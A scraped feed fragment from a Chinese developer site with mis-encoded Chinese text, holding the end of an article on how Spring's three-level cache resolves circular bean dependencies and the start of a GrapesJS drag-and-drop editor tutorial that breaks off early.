    <span class="hljs-comment">// ä¸‰çº§ç¼“å­˜ï¼šä¿å­˜Beançš„åˆ›å»ºå·¥å‚ï¼ˆç”¨äºç”Ÿæˆæ—©æœŸBeanå¼•ç”¨ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">ObjectFactory</span>&lt;?&gt;&gt; singletonFactories = <span class="hljs-keyword">new</span> <span class="hljs-type">HashMap</span>(<span class="hljs-number">16</span>);
}
</code></pre>





























<table><thead><tr><th>ç¼“å­˜å±‚çº§</th><th>åç§°</th><th>æ ¸å¿ƒä½œç”¨</th><th>æ•°æ®ç±»å‹</th></tr></thead><tbody><tr><td>ä¸€çº§ç¼“å­˜</td><td>singletonObjects</td><td>å­˜å‚¨å®Œå…¨åˆå§‹åŒ–çš„æˆç†ŸBean</td><td>Map&lt;String, Object&gt;</td></tr><tr><td>äºŒçº§ç¼“å­˜</td><td>earlySingletonObjects</td><td>å­˜å‚¨å®ä¾‹åŒ–å®Œæˆçš„æ—©æœŸBeanå¼•ç”¨</td><td>Map&lt;String, Object&gt;</td></tr><tr><td>ä¸‰çº§ç¼“å­˜</td><td>singletonFactories</td><td>å­˜å‚¨Beançš„åˆ›å»ºå·¥å‚</td><td>Map&lt;String, ObjectFactory&gt;</td></tr></tbody></table>
<h3 data-id="heading-3">ä¸‰ã€ä¸‰çº§ç¼“å­˜è§£å†³å¾ªç¯ä¾èµ–çš„æ ¸å¿ƒé€»è¾‘</h3>
<p>Springå°†Beançš„åˆ›å»ºåˆ†ä¸º<strong>å®ä¾‹åŒ–</strong>ï¼ˆè°ƒç”¨æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼‰å’Œ<strong>åˆå§‹åŒ–</strong>ï¼ˆå¡«å……å±æ€§ã€æ‰§è¡Œåˆå§‹åŒ–æ–¹æ³•ï¼‰ä¸¤ä¸ªé˜¶æ®µï¼Œä¸‰çº§ç¼“å­˜çš„æ ¸å¿ƒä½œç”¨æ˜¯åœ¨â€œå®ä¾‹åŒ–åã€åˆå§‹åŒ–å‰â€æå‰æš´éœ²Beanå¼•ç”¨ã€‚</p>
<h4 data-id="heading-4">æ ¸å¿ƒè·å–é€»è¾‘ï¼ˆgetSingletonæ–¹æ³•ï¼‰</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Nullable</span>
<span class="hljs-keyword">protected</span> Object getSingleton(String beanName, boolean allowEarlyReference) {
    <span class="hljs-comment">// 1. ä¼˜å…ˆä»ä¸€çº§ç¼“å­˜è·å–å®Œå…¨åˆå§‹åŒ–çš„Bean</span>
    Object singletonObject = <span class="hljs-keyword">this</span>.singletonObjects.<span class="hljs-keyword">get</span>(beanName);
    
    <span class="hljs-comment">// 2. ä¸€çº§ç¼“å­˜æ— æ•°æ®ï¼Œä¸”å½“å‰Beanæ­£åœ¨åˆ›å»ºä¸­ â†’ å°è¯•äºŒçº§ç¼“å­˜</span>
    <span class="hljs-keyword">if</span> (singletonObject == <span class="hljs-literal">null</span> &amp;&amp; isSingletonCurrentlyInCreation(beanName)) {
        singletonObject = <span class="hljs-keyword">this</span>.earlySingletonObjects.<span class="hljs-keyword">get</span>(beanName);
        
        <span class="hljs-comment">// 3. äºŒçº§ç¼“å­˜æ— æ•°æ®ï¼Œä¸”å…è®¸æå‰å¼•ç”¨ â†’ ä»ä¸‰çº§ç¼“å­˜ç”Ÿæˆæ—©æœŸBean</span>
        <span class="hljs-keyword">if</span> (singletonObject == <span class="hljs-literal">null</span> &amp;&amp; allowEarlyReference) {
            <span class="hljs-comment">// åŠ é”ä¿è¯ç¼“å­˜æ“ä½œçš„çº¿ç¨‹å®‰å…¨ï¼ˆç»Ÿä¸€é”ä¸€çº§ç¼“å­˜é¿å…å¤šé”æ­»é”ï¼‰</span>
            synchronized (<span class="hljs-keyword">this</span>.singletonObjects) {
                <span class="hljs-comment">// åŒé‡æ£€æŸ¥ï¼šå†æ¬¡ç¡®è®¤ä¸€çº§/äºŒçº§ç¼“å­˜ï¼ˆé˜²æ­¢å¹¶å‘å†™å…¥ï¼‰</span>
                singletonObject = <span class="hljs-keyword">this</span>.singletonObjects.<span class="hljs-keyword">get</span>(beanName);
                <span class="hljs-keyword">if</span> (singletonObject == <span class="hljs-literal">null</span>) {
                    singletonObject = <span class="hljs-keyword">this</span>.earlySingletonObjects.<span class="hljs-keyword">get</span>(beanName);
                    <span class="hljs-keyword">if</span> (singletonObject == <span class="hljs-literal">null</span>) {
                        <span class="hljs-comment">// 4. ä»ä¸‰çº§ç¼“å­˜è·å–Beanå·¥å‚ï¼Œç”Ÿæˆæ—©æœŸBeanå¼•ç”¨</span>
                        ObjectFactory&lt;?&gt; singletonFactory = <span class="hljs-keyword">this</span>.singletonFactories.<span class="hljs-keyword">get</span>(beanName);
                        <span class="hljs-keyword">if</span> (singletonFactory != <span class="hljs-literal">null</span>) {
                            singletonObject = singletonFactory.getObject();
                            <span class="hljs-comment">// 5. å°†æ—©æœŸBeanå­˜å…¥äºŒçº§ç¼“å­˜ï¼ŒåŒæ—¶ç§»é™¤ä¸‰çº§ç¼“å­˜çš„å·¥å‚</span>
                            <span class="hljs-keyword">this</span>.earlySingletonObjects.put(beanName, singletonObject);
                            <span class="hljs-keyword">this</span>.singletonFactories.remove(beanName);
                        }
                    }
                }
            }
        }
    }
    <span class="hljs-keyword">return</span> singletonObject;
}
</code></pre>
<h4 data-id="heading-5">å¾ªç¯ä¾èµ–è§£å†³æµç¨‹ï¼ˆä»¥Aâ†â†’Bå¾ªç¯ä¾èµ–ä¸ºä¾‹ï¼‰</h4>
<ol>
<li>
<p>Springåˆ›å»ºBean Aï¼Œå®Œæˆå®ä¾‹åŒ–åï¼Œå°†Açš„åˆ›å»ºå·¥å‚å­˜å…¥<strong>ä¸‰çº§ç¼“å­˜</strong>ï¼›</p>
</li>
<li>
<p>åˆå§‹åŒ–Aæ—¶ï¼Œå‘ç°éœ€è¦æ³¨å…¥Bean Bï¼Œè§¦å‘Bçš„åˆ›å»ºæµç¨‹ï¼›</p>
</li>
<li>
<p>Springåˆ›å»ºBean Bï¼Œå®Œæˆå®ä¾‹åŒ–åï¼Œå°†Bçš„åˆ›å»ºå·¥å‚å­˜å…¥<strong>ä¸‰çº§ç¼“å­˜</strong>ï¼›</p>
</li>
<li>
<p>åˆå§‹åŒ–Bæ—¶ï¼Œå‘ç°éœ€è¦æ³¨å…¥Bean Aï¼Œè°ƒç”¨<code>getSingleton(A)</code>ï¼š</p>
<ol>
<li>ä¸€çº§ç¼“å­˜æ— Aï¼ˆæœªåˆå§‹åŒ–å®Œæˆï¼‰ï¼ŒäºŒçº§ç¼“å­˜æ— Aï¼›</li>
<li>ä»ä¸‰çº§ç¼“å­˜è·å–Açš„å·¥å‚ï¼Œç”ŸæˆAçš„æ—©æœŸå¼•ç”¨ï¼Œå­˜å…¥<strong>äºŒçº§ç¼“å­˜</strong>ï¼›</li>
<li>å°†Açš„æ—©æœŸå¼•ç”¨è¿”å›ç»™Bï¼ŒBå®Œæˆåˆå§‹åŒ–ï¼Œå­˜å…¥<strong>ä¸€çº§ç¼“å­˜</strong>ï¼›</li>
</ol>
</li>
<li>
<p>Aæ‹¿åˆ°Bçš„æˆç†Ÿå¼•ç”¨ï¼ˆä¸€çº§ç¼“å­˜ï¼‰ï¼Œå®Œæˆè‡ªèº«åˆå§‹åŒ–ï¼Œå­˜å…¥<strong>ä¸€çº§ç¼“å­˜</strong>ï¼›</p>
</li>
<li>
<p>æœ€ç»ˆAã€Bå‡å­˜å…¥ä¸€çº§ç¼“å­˜ï¼Œå¾ªç¯ä¾èµ–é—®é¢˜è§£å†³ã€‚</p>
</li>
</ol>
<h3 data-id="heading-6">å››ã€ç¼“å­˜æ“ä½œåŠ é”çš„åŸå› </h3>
<p>ç¼“å­˜æ“ä½œæ—¶å¯¹<code>singletonObjects</code>ï¼ˆä¸€çº§ç¼“å­˜ï¼‰åŠ é”ï¼Œæ ¸å¿ƒç›®çš„æ˜¯ï¼š</p>
<ol>
<li>
<p><strong>ä¿è¯</strong> <strong>ç¼“å­˜ä¸€è‡´æ€§</strong>ï¼šé˜²æ­¢å¤šçº¿ç¨‹å¹¶å‘æ“ä½œç¼“å­˜æ—¶ï¼Œå‡ºç°â€œè¯»å–åˆ°ä¸å®Œæ•´æ•°æ®â€â€œé‡å¤åˆ›å»ºBeanâ€ç­‰ä¸€è‡´æ€§é—®é¢˜ï¼›</p>
</li>
<li>
<p><strong>é¿å…</strong> <strong>æ­»é”</strong> <strong>é£é™©</strong>ï¼šç»Ÿä¸€é”å®šä¸€çº§ç¼“å­˜ï¼Œè€Œéä¸ºä¸‰çº§ç¼“å­˜åˆ†åˆ«åŠ é”ï¼Œå‡å°‘å¤šé”åµŒå¥—å¯¼è‡´çš„æ­»é”æ¦‚ç‡ï¼›</p>
</li>
<li>
<p><strong>åŒé‡æ£€æŸ¥ä¿éšœ</strong>ï¼šåŠ é”åçš„â€œåŒé‡æ£€æŸ¥â€é€»è¾‘ï¼Œèƒ½æœ‰æ•ˆé˜²æ­¢å¹¶å‘åœºæ™¯ä¸‹çš„ç¼“å­˜ç©¿é€ã€‚</p>
</li>
</ol>
<p>é‚£ä¹ˆ ä¸‰çº§ç¼“å­˜ä¸€å®šèƒ½å¤Ÿè§£å†³å¾ªç¯ä¾èµ–å— ç­”æ¡ˆæ˜¯ä¸èƒ½å®Œå…¨è§£å†³</p>
<p>åœ¨æ„é€ å™¨æ³¨å…¥äº§ç”Ÿçš„å¾ªç¯ä¾èµ– åˆ™éœ€è¦é‡‡ç”¨å…¶ä»–æ–¹æ³•</p>
<h3 data-id="heading-7">äº”ã€ä¸‰çº§ç¼“å­˜çš„åœºæ™¯é™åˆ¶ï¼šæ— æ³•è§£å†³æ„é€ å™¨æ³¨å…¥å¾ªç¯ä¾èµ–</h3>
<p>ä¸‰çº§ç¼“å­˜ä»…èƒ½è§£å†³<strong>å­—æ®µæ³¨å…¥/setteræ³¨å…¥</strong>çš„å¾ªç¯ä¾èµ–ï¼Œæ— æ³•è§£å†³<strong>æ„é€ å™¨æ³¨å…¥</strong>çš„å¾ªç¯ä¾èµ–ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p>
<ol>
<li>Spring Beançš„åˆ›å»ºæµç¨‹ä¸­ï¼Œ<strong>æ„é€ å™¨æ³¨å…¥å‘ç”Ÿåœ¨å®ä¾‹åŒ–é˜¶æ®µ</strong>ï¼ˆè°ƒç”¨æ„é€ æ–¹æ³•æ—¶ï¼‰ï¼Œæ­¤æ—¶Beanå°šæœªå®Œæˆå®ä¾‹åŒ–ï¼Œæ— æ³•ç”Ÿæˆæ—©æœŸå¼•ç”¨ï¼›</li>
<li>ä¸‰çº§ç¼“å­˜çš„æ ¸å¿ƒé€»è¾‘æ˜¯â€œå®ä¾‹åŒ–åã€åˆå§‹åŒ–å‰â€æå‰æš´éœ²å¼•ç”¨ï¼Œè€Œæ„é€ å™¨æ³¨å…¥çš„å¾ªç¯ä¾èµ–å‘ç”Ÿåœ¨å®ä¾‹åŒ–é˜¶æ®µï¼Œç¼“å­˜æœºåˆ¶å°šæœªä»‹å…¥ã€‚</li>
</ol>
<h4 data-id="heading-8">æ„é€ å™¨æ³¨å…¥å¾ªç¯ä¾èµ–çš„è§£å†³æ–¹æ¡ˆ</h4>
<p>é€šè¿‡Springæä¾›çš„<code>@Lazy</code>æ³¨è§£å»¶è¿Ÿæ„é€ å™¨æ³¨å…¥çš„Beanåˆå§‹åŒ–ï¼š</p>
<ul>
<li><code>@Lazy</code>ä¼šè®©Springåœ¨æ„é€ å™¨æ³¨å…¥æ—¶ï¼Œè¿”å›ä¸€ä¸ªBeançš„ä»£ç†å¯¹è±¡ï¼ˆè€ŒéçœŸå®å¯¹è±¡ï¼‰ï¼›</li>
<li>çœŸå®å¯¹è±¡çš„åˆ›å»ºä¼šå»¶è¿Ÿåˆ°é¦–æ¬¡ä½¿ç”¨æ—¶ï¼Œä»è€Œæ‰“ç ´æ„é€ å™¨é˜¶æ®µçš„å¾ªç¯ä¾èµ–ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Component</span>
public class A {
    <span class="hljs-comment">// æ„é€ å™¨æ³¨å…¥Bæ—¶æ·»åŠ @Lazyï¼Œå»¶è¿ŸBçš„åˆå§‹åŒ–</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">A</span>(<span class="hljs-variable">@Lazy</span> B b) {
        <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.b</span> = <span class="hljs-selector-tag">b</span>;
    }
}

@<span class="hljs-selector-tag">Component</span>
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">B</span> {
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">B</span>(A a) {
        <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.a</span> = <span class="hljs-selector-tag">a</span>;
    }
}
</code></pre>
<h4 data-id="heading-9">æ€»ç»“</h4>
<ol>
<li>ä¸‰çº§ç¼“å­˜çš„æ ¸å¿ƒæ˜¯é€šè¿‡â€œå®ä¾‹åŒ–åæå‰æš´éœ²æ—©æœŸå¼•ç”¨â€ï¼Œè§£å†³å­—æ®µ/setteræ³¨å…¥çš„å¾ªç¯ä¾èµ–ï¼›</li>
<li>ç¼“å­˜æ“ä½œåŠ é”æ˜¯ä¸ºäº†ä¿è¯å¹¶å‘å®‰å…¨ï¼Œç»Ÿä¸€é”ä¸€çº§ç¼“å­˜å¯é¿å…æ­»é”ï¼›</li>
<li>ä¸‰çº§ç¼“å­˜æ— æ³•è§£å†³æ„é€ å™¨æ³¨å…¥å¾ªç¯ä¾èµ–ï¼Œéœ€é€šè¿‡<code>@Lazy</code>æ³¨è§£å»¶è¿Ÿåˆå§‹åŒ–è§£å†³ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GrapesJS å®Œå…¨æŒ‡å—ï¼šä»é›¶æ„å»ºä½ çš„å¯è§†åŒ–æ‹–æ‹½ç¼–è¾‘å™¨]]></title>    <link>https://juejin.cn/post/7594303825013260303</link>    <guid>https://juejin.cn/post/7594303825013260303</guid>    <pubDate>2026-01-12T17:14:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594303825013260303" data-draft-id="7594315259462434851" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GrapesJS å®Œå…¨æŒ‡å—ï¼šä»é›¶æ„å»ºä½ çš„å¯è§†åŒ–æ‹–æ‹½ç¼–è¾‘å™¨"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,å‰ç«¯æ¡†æ¶"/> <meta itemprop="datePublished" content="2026-01-12T17:14:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xiayuguo"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476706589"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GrapesJS å®Œå…¨æŒ‡å—ï¼šä»é›¶æ„å»ºä½ çš„å¯è§†åŒ–æ‹–æ‹½ç¼–è¾‘å™¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476706589/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xiayuguo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T17:14:38.000Z" title="Mon Jan 12 2026 17:14:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>éšç€â€œä½ä»£ç â€å’Œâ€œæ— ä»£ç â€è¶‹åŠ¿çš„å…´èµ·ï¼Œä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªç›´è§‚çš„æ‹–æ‹½å¼ï¼ˆDrag &amp; Dropï¼‰ç¼–è¾‘å™¨å·²æˆä¸ºè®¸å¤šä¼ä¸šçº§åº”ç”¨çš„æ ‡å‡†é…ç½®ã€‚è€Œåœ¨å¼€æºä¸–ç•Œä¸­ï¼Œ<strong>GrapesJS</strong> æ— ç–‘æ˜¯å®ç°è¿™ä¸€åŠŸèƒ½æœ€å¼ºå¤§çš„æ¡†æ¶ã€‚</p>
<p>æœ¬æ–‡å°†å¸¦ä½ ä»åº•å±‚æ¶æ„åˆ°ä»£ç å®ç°ï¼Œä¸€æ­¥æ­¥æŒæ¡å¦‚ä½•æ„å»ºä¸€ä¸ªå±äºè‡ªå·±çš„å¯è§†åŒ–ç¼–è¾‘å™¨ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ ä¸ºä»€ä¹ˆé€‰æ‹© GrapesJSï¼Ÿ</h2>
<p>åœ¨é€‰æ‹©å¯è§†åŒ–ç¼–è¾‘å™¨æ–¹æ¡ˆæ—¶ï¼Œå¼€å‘è€…é€šå¸¸ä¼šåœ¨ <code>Quill</code>ï¼ˆä¾§é‡å¯Œæ–‡æœ¬ï¼‰ã€<code>Elementor</code>ï¼ˆä¾§é‡ WordPressï¼‰å’Œ <code>GrapesJS</code> ä¹‹é—´æƒè¡¡ã€‚</p>
<p>GrapesJS çš„æ ¸å¿ƒä¼˜åŠ¿åœ¨äºå®ƒçš„**â€œæ¡†æ¶å±æ€§â€**ï¼š</p>
<ol>
<li><strong>é›¶ä¾èµ– UI</strong>ï¼šå®ƒä¸å¼ºåˆ¶ä½ ä½¿ç”¨ç‰¹å®šçš„ UI åº“ï¼ˆReact/Vue å‡å¯é›†æˆï¼‰ã€‚</li>
<li><strong>é«˜åº¦æ¨¡å—åŒ–</strong>ï¼šå†…ç½®äº†å—ç®¡ç†å™¨ã€æ ·å¼ç®¡ç†å™¨ã€å›¾å±‚ç®¡ç†å™¨ç­‰ï¼Œä¸”å‡å¯è‡ªå®šä¹‰ã€‚</li>
<li><strong>å¼ºå¤§çš„æ’ä»¶ç”Ÿæ€</strong>ï¼šæ”¯æŒ MJMLï¼ˆé‚®ä»¶ï¼‰ã€ç½‘é¡µã€ç”šè‡³æ˜¯ç§»åŠ¨ç«¯é¡µé¢çš„å¿«é€Ÿæ­å»ºã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-1">äºŒã€ GrapesJS æ ¸å¿ƒæ¶æ„è§£æ</h2>
<p>åœ¨åŠ¨æ‰‹å†™ä»£ç å‰ï¼Œç†è§£ GrapesJS çš„â€œå››æ¢å…«æŸ±â€è‡³å…³é‡è¦ï¼š</p>





























<table><thead><tr><th><strong>æ¨¡å—</strong></th><th><strong>åŠŸèƒ½æè¿°</strong></th></tr></thead><tbody><tr><td><strong>Blocks (å—)</strong></td><td>ç¼–è¾‘å™¨çš„â€œç´ æåº“â€ï¼Œç”¨æˆ·æ‹–å…¥ç”»å¸ƒçš„æœ€å°å•å…ƒã€‚</td></tr><tr><td><strong>Components (ç»„ä»¶)</strong></td><td>ç”»å¸ƒä¸­çš„å®æ—¶å…ƒç´ ï¼Œæ‹¥æœ‰è‡ªå·±çš„å±æ€§å’Œè¡Œä¸ºã€‚</td></tr><tr><td><strong>Styles (æ ·å¼)</strong></td><td>å¯¹åº” CSSï¼Œæ§åˆ¶é¢œè‰²ã€å¸ƒå±€ã€é—´è·ç­‰ã€‚</td></tr><tr><td><strong>Traits (ç‰¹å¾)</strong></td><td>å¯¹åº” HTML å±æ€§ï¼Œå¦‚ <code>&lt;a&gt;</code> æ ‡ç­¾çš„ <code>href</code> æˆ–å›¾ç‰‡çš„ <code>alt</code>ã€‚</td></tr><tr><td><strong>Storage (å­˜å‚¨)</strong></td><td>å†³å®šå¦‚ä½•å°†ç¼–è¾‘ç»“æœä¿å­˜åˆ°æ•°æ®åº“æˆ–æœ¬åœ°ã€‚</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€ åŠ¨æ‰‹å®æˆ˜ï¼šä»é›¶å¼€å§‹åˆå§‹åŒ–</h2>
<h3 data-id="heading-3">1. ç¯å¢ƒå‡†å¤‡</h3>
<p>ä½ å¯ä»¥é€šè¿‡ NPM å®‰è£…ï¼Œä½†åœ¨æœ¬æŒ‡å—ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ CDN å¿«é€Ÿæ­å»ºåŸå‹ã€‚</p>
<p>HTML</p>
<pre><code class="hljs language-ini" lang="ini">&lt;link <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"https://unpkg.com/grapesjs/dist/css/grapes.min.css"</span>&gt;
&lt;script <span class="hljs-attr">src</span>=<span class="hljs-string">"https://unpkg.com/grapesjs"</span>&gt;&lt;/script&gt;

&lt;div <span class="hljs-attr">id</span>=<span class="hljs-string">"gjs"</span>&gt;&lt;/div&gt;
</code></pre>
<h3 data-id="heading-4">2. æ ¸å¿ƒåˆå§‹åŒ–ä»£ç </h3>
<p>JavaScript</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">editor</span> = grapesjs.<span class="hljs-title function_ invoke__">init</span>({
  <span class="hljs-attr">container</span>: <span class="hljs-string">'#gjs'</span>,
  <span class="hljs-attr">height</span>: <span class="hljs-string">'100vh'</span>,
  <span class="hljs-attr">width</span>: <span class="hljs-string">'auto'</span>,
  // ç¦æ­¢ä»å·²æœ‰çš„ HTML å…ƒç´ è‡ªåŠ¨è½½å…¥
  <span class="hljs-attr">fromElement</span>: <span class="hljs-literal">false</span>,
  // å­˜å‚¨è®¾ç½®
  <span class="hljs-attr">storageManager</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'local'</span> }, 
  // å®šä¹‰é¢æ¿ï¼ˆPanelsï¼‰
  <span class="hljs-attr">panels</span>: { <span class="hljs-attr">defaults</span>: [] }, 
});
</code></pre>
<hr/>
<h2 data-id="heading-5">å››ã€ æ·±åº¦å®šåˆ¶ï¼šè®©ç¼–è¾‘å™¨â€œå¥½ç”¨â€èµ·æ¥</h2>
<p>ä¸€ä¸ªç©ºç”»å¸ƒæ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºå…¶æ·»åŠ å·¥å…·ã€‚</p>
<h3 data-id="heading-6">ç¬¬ä¸€æ­¥ï¼šé…ç½®å—ç®¡ç†å™¨ (Block Manager)</h3>
<p>å—æ˜¯ç”¨æˆ·çš„åˆ›ä½œèµ·ç‚¹ã€‚æˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€æ®µç®€å•çš„ HTMLã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">editor</span><span class="hljs-selector-class">.Blocks</span><span class="hljs-selector-class">.add</span>(<span class="hljs-string">'my-first-block'</span>, {
  label: 'ç®€å•æ–‡æœ¬',
  <span class="hljs-attribute">content</span>: <span class="hljs-string">'&lt;div class="my-block"&gt;è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ªè‡ªå®šä¹‰å—&lt;/div&gt;'</span>,
  <span class="hljs-attribute">attributes</span>: { <span class="hljs-attribute">class</span>: <span class="hljs-string">'gjs-fonts gjs-f-b1'</span> } <span class="hljs-comment">// å›¾æ ‡æ ·å¼</span>
});
</code></pre>
<h3 data-id="heading-7">ç¬¬äºŒæ­¥ï¼šå¯ç”¨æ ·å¼ç®¡ç†å™¨ (Style Manager)</h3>
